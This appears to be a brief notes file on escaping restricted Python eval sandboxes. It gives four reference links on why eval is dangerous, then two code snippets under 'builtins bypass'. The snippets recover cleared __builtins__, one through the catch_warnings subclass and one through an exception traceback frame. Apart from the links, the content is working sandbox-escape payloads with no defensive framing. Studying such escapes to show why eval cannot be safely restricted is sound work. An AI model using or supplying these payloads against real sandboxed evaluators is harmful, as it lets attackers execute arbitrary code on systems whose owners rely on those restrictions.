https://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/
https://www.reddit.com/r/Python/comments/uny12/eval_really_is_dangerous/
https://stackoverflow.com/questions/35804961/python-eval-is-it-still-dangerous-if-i-disable-builtins-and-attribute-access
https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html


## builtins bypass

```
__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
```

```
lookup = lambda n: [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == n][0]
try:
    lookup('Codec')().decode('')
except lookup('BaseException') as e:
    del lookup
    __builtins__ = e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']
```
